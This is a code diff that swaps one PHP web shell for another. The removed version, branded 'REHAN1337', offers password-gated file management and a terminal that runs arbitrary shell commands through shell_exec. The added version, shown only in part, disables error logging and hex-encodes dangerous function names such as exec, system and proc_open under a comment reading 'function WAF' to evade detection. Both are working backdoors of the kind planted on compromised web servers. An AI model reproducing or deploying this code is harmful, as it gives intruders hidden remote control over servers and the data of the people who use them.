@@ -1,1179 +1,1615 @@
 <?php
 session_start();
+@set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
 
-// ============ CONFIG ============
-$PASSWORD_MD5 = "8680f339f150af4372a95cbb83f691e9";
-$ROOT         = '/';
-$START        = getcwd();
-$LOGO         = "https://new.avestahost.com/rehanx.jpg";
-$APP_NAME     = "REHAN1337";
-// ================================
+/* konfigurasi */
+/* Password using md5 hashes */
+$password = "a871191c9dfc665690da9838131ed8ea";
+$default_action = "FilesMan";
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+date_default_timezone_set("Asia/Jakarta");
+function login_shell()
+{
+?>
+    <!DOCTYPE html>
+    <html lang="en">
 
-if (isset($_POST['pass'])) {
-    if (md5($_POST['pass']) === $PASSWORD_MD5) {
-        $_SESSION['login'] = true;
-        header("Location: ?"); exit;
-    } else { $err = "Password salah!"; }
-}
-if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }
-
-// ---- Icons ----
-function icon($name, $size = 18) {
-    $icons = [
-        'folder'   => '<path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V7z"/>',
-        'file'     => '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/><path d="M14 2v6h6"/>',
-        'upload'   => '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M17 8l-5-5-5 5"/><path d="M12 3v12"/>',
-        'download' => '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M7 10l5 5 5-5"/><path d="M12 15V3"/>',
-        'rename'   => '<path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/>',
-        'edit-pencil' => '<path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/>',
-        'chmod'    => '<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>',
-        'trash'    => '<polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><line x1="10" y1="11" x2="10" y2="17"/><line x1="14" y1="11" x2="14" y2="17"/>',
-        'home'     => '<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/>',
-        'logout'   => '<path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><path d="M16 17l5-5-5-5"/><path d="M21 12H9"/>',
-        'plus'     => '<path d="M12 5v14"/><path d="M5 12h14"/>',
-        'back'     => '<path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/>',
-        'save'     => '<path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><path d="M17 21v-8H7v8"/><path d="M7 3v5h8"/>',
-        'lock'     => '<rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>',
-        'arrow'    => '<path d="M5 12h14"/><path d="M12 5l7 7-7 7"/>',
-        'check'    => '<polyline points="20 6 9 17 4 12"/>',
-        'x'        => '<line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>',
-        'alert'    => '<circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>',
-        'terminal' => '<polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/>',
-        'play'     => '<polygon points="5 3 19 12 5 21 5 3"/>',
-        'clear'    => '<path d="M3 6h18"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/>',
-    ];
-    $p = $icons[$name] ?? '';
-    return "<svg width='$size' height='$size' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round' style='vertical-align:middle;flex-shrink:0'>$p</svg>";
-}
-
-// ---- Delete recursive ----
-function deletePath($target) {
-    if (!file_exists($target) && !is_link($target)) {
-        return ['ok' => false, 'msg' => 'Tidak ditemukan'];
-    }
-    if (is_file($target) || is_link($target)) {
-        return @unlink($target)
-            ? ['ok' => true, 'msg' => 'File berhasil dihapus']
-            : ['ok' => false, 'msg' => 'Gagal hapus file (permission?)'];
-    }
-    if (is_dir($target)) {
-        $items = @scandir($target);
-        if ($items === false) return ['ok' => false, 'msg' => 'Tidak bisa baca folder'];
-        $allOk = true; $errors = 0;
-        foreach ($items as $it) {
-            if ($it === '.' || $it === '..') continue;
-            $r = deletePath(rtrim($target,'/') . '/' . $it);
-            if (!$r['ok']) { $allOk = false; $errors++; }
-        }
-        if (!$allOk) return ['ok' => false, 'msg' => "Sebagian isi gagal dihapus ($errors item)"];
-        return @rmdir($target)
-            ? ['ok' => true, 'msg' => 'Folder + semua isi berhasil dihapus']
-            : ['ok' => false, 'msg' => 'Gagal hapus folder (permission?)'];
-    }
-    return ['ok' => false, 'msg' => 'Tipe tidak dikenali'];
-}
-
-// ---- Server Info ----
-$hostname = @php_uname('n') ?: 'server';
-$uname    = @php_uname('s') . ' ' . @php_uname('r');
-$user     = function_exists('posix_getpwuid') ? (@posix_getpwuid(@posix_geteuid())['name'] ?? 'unknown') : 'unknown';
-$total    = @disk_total_space('/');
-$free     = @disk_free_space('/');
-$hddPct   = ($total && $total > 0) ? round((($total - $free) / $total) * 100) : 0;
-$hddTxt   = ($total && $total > 0) ? round($free/1073741824,1) . ' GB free / ' . round($total/1073741824,1) . ' GB' : 'N/A';
-
-// ---- NOTIFICATION SYSTEM ----
-$notify = null;
-if (!empty($_SESSION['flash'])) {
-    $notify = $_SESSION['flash'];
-    unset($_SESSION['flash']);
-}
-
-// ---- LOGIN ----
-if (empty($_SESSION['login'])) {
-    ?>
-    <!DOCTYPE html><html><head><meta charset="utf-8"><title><?=htmlspecialchars($APP_NAME)?> - Login</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#040814;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
-        body::before{content:'';position:absolute;inset:0;background:radial-gradient(circle at 20% 30%,rgba(30,58,138,.4),transparent 50%),radial-gradient(circle at 80% 70%,rgba(37,99,235,.3),transparent 50%);animation:pulse 8s ease-in-out infinite}
-        @keyframes pulse{0%,100%{opacity:.6}50%{opacity:1}}
-        .login-box{position:relative;background:rgba(10,20,40,.8);backdrop-filter:blur(20px);border:1px solid rgba(59,130,246,.4);border-radius:22px;padding:50px 42px 40px;width:400px;box-shadow:0 0 50px rgba(30,58,138,.6),0 0 90px rgba(37,99,235,.3);animation:fadeIn .6s ease}
-        @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
-        .logo-wrap{width:150px;height:150px;margin:0 auto 28px;border-radius:50%;padding:4px;background:linear-gradient(135deg,#1e3a8a,#2563eb,#60a5fa,#1e3a8a);background-size:200% 200%;box-shadow:0 0 35px rgba(37,99,235,.8),0 0 70px rgba(96,165,250,.4);animation:glow 3s ease-in-out infinite,spinBorder 6s linear infinite}
-        @keyframes glow{0%,100%{box-shadow:0 0 35px rgba(37,99,235,.8),0 0 70px rgba(96,165,250,.4)}50%{box-shadow:0 0 50px rgba(96,165,250,1),0 0 90px rgba(37,99,235,.6)}}
-        @keyframes spinBorder{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
-        .logo-wrap img{width:100%;height:100%;border-radius:50%;object-fit:cover;display:block}
-        h2{color:#fff;text-align:center;font-size:28px;font-weight:800;margin-bottom:6px;letter-spacing:1px;background:linear-gradient(135deg,#60a5fa,#3b82f6,#1e3a8a);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;text-shadow:0 0 30px rgba(96,165,250,.5)}
-        .subtitle{color:#94a3b8;text-align:center;font-size:13px;margin-bottom:32px;opacity:.85;letter-spacing:.5px}
-        .input-group{position:relative;margin-bottom:20px}
-        .input-group svg{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#60a5fa;pointer-events:none}
-        input[type=password]{width:100%;padding:14px 14px 14px 45px;background:rgba(4,8,20,.9);border:1.5px solid rgba(59,130,246,.3);border-radius:12px;color:#fff;font-size:14px;outline:none;transition:all .3s;font-family:inherit}
-        input[type=password]:focus{border-color:#60a5fa;box-shadow:0 0 0 3px rgba(59,130,246,.2),0 0 20px rgba(59,130,246,.4)}
-        input::placeholder{color:#64748b}
-        button{width:100%;padding:14px;background:linear-gradient(135deg,#1e3a8a,#2563eb,#3b82f6);border:0;border-radius:12px;color:#fff;font-weight:700;font-size:14px;letter-spacing:1px;cursor:pointer;transition:all .3s;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 0 20px rgba(37,99,235,.5)}
-        button:hover{transform:translateY(-2px);box-shadow:0 0 35px rgba(37,99,235,1)}
-        .err{background:rgba(239,68,68,.15);border:1px solid rgba(239,68,68,.4);color:#fca5a5;padding:10px;border-radius:10px;text-align:center;font-size:13px;margin-bottom:20px}
-        .footer{text-align:center;color:#475569;font-size:11px;margin-top:28px;letter-spacing:1.5px;text-transform:uppercase;font-weight:600}
-        .footer span{color:#60a5fa;text-shadow:0 0 10px rgba(96,165,250,.6)}
-        @media(max-width:480px){.login-box{width:92%;padding:40px 25px 30px}.logo-wrap{width:120px;height:120px}h2{font-size:24px}}
-    </style></head><body>
-    <form class="login-box" method="post">
-        <div class="logo-wrap"><img src="<?=htmlspecialchars($LOGO)?>" alt="Logo"></div>
-        <h2><?=htmlspecialchars($APP_NAME)?></h2>
-        <div class="subtitle"></div>
-        <?php if(!empty($err)) echo "<div class='err'>".htmlspecialchars($err)."</div>"; ?>
-        <div class="input-group"><?=icon('lock',18)?><input type="password" name="pass" placeholder="Password" autofocus required></div>
-        <button type="submit"><?=icon('arrow',16)?> LOGIN</button>
-        <div class="footer">Powered by <span><?=htmlspecialchars($APP_NAME)?></span></div>
-    </form>
-    </body></html>
-    <?php exit;
-}
-
-// ===== PATH HANDLER =====
-if (isset($_GET['p']) && $_GET['p'] !== '') {
-    $raw = $_GET['p'];
-    $candidate = ($raw[0] === '/') ? $raw : $START . '/' . $raw;
-    $path = @realpath($candidate);
-    if ($path === false || !is_dir($path)) $path = realpath($START) ?: '/';
-} else {
-    $path = realpath($START) ?: '/';
-}
-$path = rtrim($path, '/');
-if ($path === '') $path = '/';
-
-function flash($type, $msg, $redirect = null) {
-    $_SESSION['flash'] = ['type' => $type, 'msg' => $msg];
-    $url = $redirect ?: ($_SERVER['REQUEST_URI'] ?? '?');
-    $clean = preg_replace('/([?&])(del|dl|edit)=[^&]*/', '$1', $url);
-    $clean = preg_replace('/[?&]+$/', '', $clean);
-    $clean = preg_replace('/[?&]+&/', '?', $clean);
-    header("Location: " . $clean);
-    exit;
-}
-
-// ---- Actions ----
-if (!empty($_FILES['file']['name'])) {
-    $t = $path . '/' . basename($_FILES['file']['name']);
-    if (@move_uploaded_file($_FILES['file']['tmp_name'], $t)) {
-        flash('success', 'File berhasil diupload: ' . basename($_FILES['file']['name']));
-    } else {
-        flash('error', 'Upload gagal! Cek permission folder.');
-    }
-}
-if (!empty($_POST['newfile'])) {
-    $f = $path . '/' . basename($_POST['newfile']);
-    if (!file_exists($f) && @file_put_contents($f,'')!==false) {
-        flash('success', 'File berhasil dibuat: ' . $_POST['newfile']);
-    } else {
-        flash('error', 'Gagal buat file!');
-    }
-}
-if (!empty($_POST['newfolder'])) {
-    $d = $path . '/' . basename($_POST['newfolder']);
-    if (@mkdir($d)) {
-        flash('success', 'Folder berhasil dibuat: ' . $_POST['newfolder']);
-    } else {
-        flash('error', 'Gagal buat folder!');
-    }
-}
-if (isset($_POST['content']) && !empty($_POST['editfile'])) {
-    $f = $path . '/' . $_POST['editfile'];
-    if (@file_put_contents($f, $_POST['content'])!==false) {
-        flash('success', 'File berhasil disimpan: ' . $_POST['editfile'], '?p=' . urlencode($path));
-    } else {
-        flash('error', 'Gagal simpan file!', '?p=' . urlencode($path));
-    }
-}
-
-// ==== DELETE ====
-if (!empty($_GET['del'])) {
-    $name = basename($_GET['del']);
-    $t = $path . '/' . $_GET['del'];
-    $r = deletePath($t);
-    if ($r['ok']) {
-        flash('success', $r['msg'] . ': ' . $name);
-    } else {
-        flash('error', $r['msg'] . ': ' . $name);
-    }
-}
-
-if (!empty($_POST['rename_from']) && !empty($_POST['rename_to'])) {
-    if (@rename($path.'/'.$_POST['rename_from'], $path.'/'.$_POST['rename_to'])) {
-        flash('success', 'Berhasil rename: ' . $_POST['rename_from'] . ' → ' . $_POST['rename_to']);
-    } else {
-        flash('error', 'Gagal rename!');
-    }
-}
-if (!empty($_POST['chmod_file']) && !empty($_POST['chmod_mode'])) {
-    if (@chmod($path.'/'.$_POST['chmod_file'], octdec($_POST['chmod_mode']))) {
-        flash('success', 'Chmod berhasil: ' . $_POST['chmod_file'] . ' → ' . $_POST['chmod_mode']);
-    } else {
-        flash('error', 'Gagal chmod!');
-    }
-}
-if (!empty($_GET['dl'])) {
-    $f = $path . '/' . $_GET['dl'];
-    if (is_file($f)) {
-        header('Content-Type: application/octet-stream');
-        header('Content-Disposition: attachment; filename="'.basename($f).'"');
-        header('Content-Length: '.filesize($f));
-        readfile($f); exit;
-    }
-}
-
-// =============================================
-// === TERMINAL AJAX HANDLER ===
-// =============================================
-if (!empty($_POST['terminal_cmd'])) {
-    header('Content-Type: application/json');
-    $cmd = trim($_POST['terminal_cmd']);
-    $cwd = $_POST['cwd'] ?? $START;
-    if (!is_dir($cwd)) $cwd = $START;
-
-    $output = '';
-    $newCwd = $cwd;
-
-    // Built-in commands (tanpa shell_exec, lebih aman)
-    $parts = preg_split('/\s+/', $cmd, 2);
-    $base  = strtolower($parts[0] ?? '');
-    $args  = $parts[1] ?? '';
-
-    try {
-        switch ($base) {
-            case '':
-                break;
-            case 'pwd':
-                $output = $cwd . "\n";
-                break;
-            case 'whoami':
-                $output = (function_exists('posix_getpwuid') ? (@posix_getpwuid(@posix_geteuid())['name'] ?? 'unknown') : 'unknown') . "\n";
-                break;
-            case 'id':
-                $output = @shell_exec('id 2>&1');
-                break;
-            case 'uname':
-                $output = @php_uname('a') . "\n";
-                break;
-            case 'hostname':
-                $output = @php_uname('n') . "\n";
-                break;
-            case 'date':
-                $output = date('D M j H:i:s T Y') . "\n";
-                break;
-            case 'echo':
-                $output = $args . "\n";
-                break;
-            case 'ls':
-                $list = @scandir($cwd);
-                if ($list === false) { $output = "ls: cannot access '" . $cwd . "': Permission denied\n"; break; }
-                $list = array_filter($list, fn($x) => $x !== '.' && $x !== '..');
-                sort($list);
-                if ($args === '-la' || $args === '-l') {
-                    foreach ($list as $it) {
-                        $full = $cwd . '/' . $it;
-                        $perms = substr(sprintf('%o', @fileperms($full)), -4);
-                        $size = is_dir($full) ? '     -' : sprintf('%6s', round(@filesize($full)/1024,1).'K');
-                        $mtime = date('M d H:i', @filemtime($full));
-                        $type = is_dir($full) ? 'd' : '-';
-                        $output .= $type . $perms . '  ' . $size . '  ' . $mtime . '  ' . $it . (is_dir($full)?'/':'') . "\n";
-                    }
-                } else {
-                    $output = implode('  ', $list) . "\n";
-                }
-                break;
-            case 'cd':
-                if ($args === '' || $args === '~') {
-                    $newCwd = $START;
-                } elseif ($args === '-') {
-                    $newCwd = $_POST['prev_cwd'] ?? $START;
-                } elseif (substr($args, 0, 1) === '/') {
-                    $newCwd = $args;
-                } else {
-                    $newCwd = rtrim($cwd, '/') . '/' . $args;
-                }
-                $newCwd = @realpath($newCwd);
-                if ($newCwd === false || !is_dir($newCwd)) {
-                    $output = "cd: no such file or directory: " . $args . "\n";
-                    $newCwd = $cwd;
-                }
-                break;
-            case 'cat':
-                $target = substr($args, 0, 1) === '/' ? $args : rtrim($cwd,'/').'/'.$args;
-                if (is_file($target) && is_readable($target)) {
-                    $output = @file_get_contents($target);
-                    if ($output === false) $output = "cat: read error\n";
-                } else {
-                    $output = "cat: " . $args . ": No such file or permission denied\n";
-                }
-                break;
-            case 'head':
-                $target = substr($args, 0, 1) === '/' ? $args : rtrim($cwd,'/').'/'.$args;
-                if (is_file($target)) {
-                    $lines = @file($target, FILE_IGNORE_NEW_LINES);
-                    $output = implode("\n", array_slice($lines, 0, 10)) . "\n";
-                } else {
-                    $output = "head: " . $args . ": No such file\n";
-                }
-                break;
-            case 'tail':
-                $target = substr($args, 0, 1) === '/' ? $args : rtrim($cwd,'/').'/'.$args;
-                if (is_file($target)) {
-                    $lines = @file($target, FILE_IGNORE_NEW_LINES);
-                    $output = implode("\n", array_slice($lines, -10)) . "\n";
-                } else {
-                    $output = "tail: " . $args . ": No such file\n";
-                }
-                break;
-            case 'mkdir':
-                if ($args === '') { $output = "mkdir: missing operand\n"; break; }
-                $target = substr($args, 0, 1) === '/' ? $args : rtrim($cwd,'/').'/'.$args;
-                $output = @mkdir($target) ? '' : "mkdir: cannot create directory: $args\n";
-                break;
-            case 'rm':
-                if ($args === '') { $output = "rm: missing operand\n"; break; }
-                $target = substr($args, 0, 1) === '/' ? $args : rtrim($cwd,'/').'/'.$args;
-                $r = deletePath($target);
-                $output = $r['ok'] ? '' : "rm: " . $r['msg'] . "\n";
-                break;
-            case 'touch':
-                if ($args === '') { $output = "touch: missing operand\n"; break; }
-                $target = substr($args, 0, 1) === '/' ? $args : rtrim($cwd,'/').'/'.$args;
-                $output = @touch($target) ? '' : "touch: cannot touch: $args\n";
-                break;
-            case 'df':
-                $output = "Filesystem      Size  Used Avail Use% Mounted on\n";
-                $t = @disk_total_space('/');
-                $f = @disk_free_space('/');
-                if ($t && $f) {
-                    $used = $t - $f;
-                    $pct  = round(($used / $t) * 100);
-                    $output .= sprintf("%-14s %5.1fG %5.1fG %5.1fG %3d%% /\n", '/dev/root', $t/1073741824, $used/1073741824, $f/1073741824, $pct);
-                } else {
-                    $output .= "df: cannot read filesystem info\n";
-                }
-                break;
-            case 'free':
-                $output = "              total        used        free\n";
-                $t = @disk_total_space('/');
-                $f = @disk_free_space('/');
-                if ($t && $f) {
-                    $output .= sprintf("Mem/Disk: %10.1fG %10.1fG %10.1fG\n", $t/1073741824, ($t-$f)/1073741824, $f/1073741824);
-                } else {
-                    $output .= "free: cannot read memory info\n";
-                }
-                break;
-            case 'ps':
-                $output = @shell_exec('ps aux 2>&1 | head -20');
-                break;
-            case 'uptime':
-                $output = @shell_exec('uptime 2>&1');
-                break;
-            case 'clear':
-                $output = '__CLEAR__';
-                break;
-            case 'help':
-                $output = "Available commands (built-in):\n";
-                $output .= "  ls [-l|-la]   List files\n";
-                $output .= "  cd <dir>      Change directory\n";
-                $output .= "  pwd           Print working directory\n";
-                $output .= "  cat <file>    Show file contents\n";
-                $output .= "  head <file>   First 10 lines\n";
-                $output .= "  tail <file>   Last 10 lines\n";
-                $output .= "  mkdir <dir>   Create folder\n";
-                $output .= "  touch <file>  Create empty file\n";
-                $output .= "  rm <path>     Delete file/folder\n";
-                $output .= "  echo <text>   Print text\n";
-                $output .= "  whoami/id     User info\n";
-                $output .= "  uname/hostname/date\n";
-                $output .= "  df/free/ps/uptime\n";
-                $output .= "  clear         Clear terminal\n";
-                $output .= "  help          Show this help\n";
-                $output .= "\nAll other commands executed via system shell.\n";
-                break;
-            default:
-                // Fallback: shell_exec untuk perintah lain (jika tersedia)
-                if (function_exists('shell_exec')) {
-                    $fullCmd = 'cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1';
-                    $output = @shell_exec($fullCmd);
-                    if ($output === null) {
-                        $output = "Command not found: " . $base . "\n";
-                    }
-                } else {
-                    $output = "shell_exec disabled. Command not available: " . $base . "\n";
-                }
-        }
-    } catch (Throwable $e) {
-        $output = "Error: " . $e->getMessage() . "\n";
-    }
-
-    echo json_encode([
-        'output' => $output,
-        'cwd'    => $newCwd,
-    ]);
-    exit;
-}
-
-// ---- Editor ----
-if (!empty($_GET['edit'])) {
-    $f = $path . '/' . $_GET['edit'];
-    if (is_file($f)) {
-        $content = htmlspecialchars(file_get_contents($f));
-        $fname = htmlspecialchars($_GET['edit']);
-        $back = '?p='.urlencode($path);
-        ?>
-        <!DOCTYPE html><html><head><meta charset="utf-8"><title><?=htmlspecialchars($APP_NAME)?> - Edit: <?=$fname?></title>
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <style>
-            *{box-sizing:border-box;margin:0;padding:0}
-            body{background:#040814;color:#e2e8f0;font-family:'Segoe UI',system-ui,sans-serif;height:100vh;display:flex;flex-direction:column}
-            .bar{background:rgba(10,20,40,.9);backdrop-filter:blur(15px);border-bottom:1px solid rgba(59,130,246,.3);padding:14px 20px;display:flex;align-items:center;gap:15px}
-            .bar a{color:#60a5fa;text-decoration:none;display:flex;align-items:center;gap:6px;font-size:14px}
-            .bar a:hover{color:#93c5fd}
-            .fname{color:#fff;font-weight:600;font-size:14px;flex:1;overflow:hidden;text-overflow:ellipsis}
-            .save-btn{background:linear-gradient(135deg,#1e3a8a,#2563eb);color:#fff;border:0;padding:8px 20px;border-radius:8px;cursor:pointer;font-weight:700;font-size:13px;display:flex;align-items:center;gap:6px;box-shadow:0 0 15px rgba(37,99,235,.6)}
-            .save-btn:hover{box-shadow:0 0 25px rgba(37,99,235,.9)}
-            textarea{flex:1;width:100%;background:#040814;color:#e2e8f0;border:0;padding:20px;font-family:'JetBrains Mono','Courier New',monospace;font-size:14px;line-height:1.6;resize:none;outline:none;tab-size:4}
-        </style></head><body>
-        <div class="bar">
-            <a href="<?=$back?>"><?=icon('back',16)?> Back</a>
-            <div class="fname"><?=$fname?></div>
-            <button type="submit" form="ef" class="save-btn"><?=icon('save',14)?> SAVE</button>
-        </div>
-        <form method="post" id="ef" style="flex:1;display:flex;flex-direction:column">
-            <input type="hidden" name="editfile" value="<?=$fname?>">
-            <textarea name="content" spellcheck="false"><?=$content?></textarea>
+            body {
+                font-family: monospace
+            }
+
+            input[type=password] {
+                border: none;
+                border-bottom: 1px solid #000;
+                padding: 2px
+            }
+
+            input[type=password]:focus {
+                outline: 0
+            }
+
+            input[type=submit] {
+                border: none;
+                padding: 4.5px 20px;
+                background-color: #2e313d;
+                color: #fff
+            }
+        </style>
+    </head>
+
+    <body>
+        <form action="" method="post">
+            <div align="center">
+                <input type="password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value=">">
+            </div>
         </form>
-        </body></html>
-        <?php exit;
-    }
-}
+    </body>
 
-// =============================================
-// === URUTKAN: FOLDER DULU, BARU FILE ===
-// =============================================
-$rawItems = @scandir($path) ?: [];
-$folders = [];
-$files = [];
-foreach ($rawItems as $it) {
-    if ($it === '.' || $it === '..') continue;
-    $full = $path.'/'.$it;
-    if (is_dir($full)) {
-        $folders[] = $it;
+    </html>
+<?php
+    exit;
+}
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
     } else {
-        $files[] = $it;
+        login_shell();
     }
 }
-usort($folders, 'strcasecmp');
-usort($files, 'strcasecmp');
+# function WAF
 
-// Build PWD parts
-$absParts = [['label'=>'/','abs'=>'/']];
-$cum = '';
-foreach (array_filter(explode('/', $path), 'strlen') as $seg) {
-    $cum .= '/'.$seg;
-    $absParts[] = ['label'=>$seg, 'abs'=>$cum];
+$Array = [
+    '676574637764', # ge  tcw d => 0
+    '676c6f62', # gl ob => 1
+    '69735f646972', # is_d ir => 2
+    '69735f66696c65', # is_ file => 3
+    '69735f7772697461626c65', # is_wr iteable => 4
+    '69735f7265616461626c65', # is_re adble => 5
+    '66696c657065726d73', # fileper ms => 6
+    '66696c65', # f ile => 7
+    '7068705f756e616d65', # php_unam e => 8
+    '6765745f63757272656e745f75736572', # getc urrentuser => 9
+    '68746d6c7370656369616c6368617273', # html special => 10
+    '66696c655f6765745f636f6e74656e7473', # fil e_get_contents => 11
+    '6d6b646972', # mk dir => 12
+    '746f756368', # to uch => 13
+    '6368646972', # ch dir => 14
+    '72656e616d65', # ren ame => 15
+    '65786563', # exe c => 16
+    '7061737374687275', # pas sthru => 17
+    '73797374656d', # syst em => 18
+    '7368656c6c5f65786563', # sh ell_exec => 19
+    '706f70656e', # p open => 20
+    '70636c6f7365', # pcl ose => 21
+    '73747265616d5f6765745f636f6e74656e7473', # stre amgetcontents => 22
+    '70726f635f6f70656e', # p roc_open => 23
+    '756e6c696e6b', # un link => 24
+    '726d646972', # rmd ir => 25
+    '666f70656e', # fop en => 26
+    '66636c6f7365', # fcl ose => 27
+    '66696c655f7075745f636f6e74656e7473', # file_put_c ontents => 28
+    '6d6f76655f75706c6f616465645f66696c65', # move_up loaded_file => 29
+    '63686d6f64', # ch mod => 30
+    '7379735f6765745f74656d705f646972', # temp _dir => 31
+];
+$hitung_array = count($Array);
+for ($i = 0; $i < $hitung_array; $i++) {
+    $fungsi[] = unx($Array[$i]);
 }
-$absLast = count($absParts) - 1;
+
+if (isset($_GET['d'])) {
+    $cdir = unx($_GET['d']);
+    $fungsi[14]($cdir);
+} else {
+    $cdir = $fungsi[0]();
+}
+
+function download($file)
+{
+
+    if (file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename=' . basename($file));
+        header('Content-Transfer-Encoding: binary');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        ob_clean();
+        flush();
+        readfile($file);
+        exit;
+    }
+}
+
+if ($_GET['don'] == true) {
+    $FilesDon = download(unx($_GET['don']));
+}
 ?>
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title><?=htmlspecialchars($APP_NAME)?> - <?=htmlspecialchars($path)?></title>
-<style>
-    *{margin:0;padding:0;box-sizing:border-box}
-    body{background:#040814;color:#e2e8f0;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;padding:22px;position:relative}
-    body::before{content:'';position:fixed;inset:0;z-index:-1;background:radial-gradient(circle at 10% 10%,rgba(30,58,138,.15),transparent 40%),radial-gradient(circle at 90% 90%,rgba(37,99,235,.15),transparent 40%)}
+<html lang="en">
 
-    /* ===== POPUP ===== */
-    .popup-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);backdrop-filter:blur(3px);z-index:9998;opacity:0;animation:fadeOverlay .3s ease forwards}
-    @keyframes fadeOverlay{to{opacity:1}}
-    .popup{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(.8);z-index:9999;min-width:320px;max-width:90vw;background:rgba(10,20,40,.95);backdrop-filter:blur(20px);border-radius:18px;padding:32px 36px 28px;text-align:center;animation:popIn .4s cubic-bezier(.34,1.56,.64,1) forwards;box-shadow:0 20px 60px rgba(0,0,0,.6)}
-    @keyframes popIn{0%{opacity:0;transform:translate(-50%,-50%) scale(.5)}100%{opacity:1;transform:translate(-50%,-50%) scale(1)}}
-    .popup.hide{animation:popOut .3s ease forwards}
-    @keyframes popOut{to{opacity:0;transform:translate(-50%,-50%) scale(.9)}}
-    .popup.success{border:2px solid rgba(59,130,246,.6);box-shadow:0 0 40px rgba(59,130,246,.5),0 20px 60px rgba(0,0,0,.6)}
-    .popup.error{border:2px solid rgba(239,68,68,.6);box-shadow:0 0 40px rgba(239,68,68,.5),0 20px 60px rgba(0,0,0,.6)}
-    .popup-icon{width:70px;height:70px;margin:0 auto 16px;border-radius:50%;display:flex;align-items:center;justify-content:center;animation:iconBounce .5s ease .1s backwards}
-    @keyframes iconBounce{0%{transform:scale(0) rotate(-180deg);opacity:0}60%{transform:scale(1.15) rotate(10deg)}100%{transform:scale(1) rotate(0);opacity:1}}
-    .popup.success .popup-icon{background:rgba(59,130,246,.15);border:2px solid rgba(59,130,246,.5);color:#60a5fa;box-shadow:0 0 25px rgba(59,130,246,.6)}
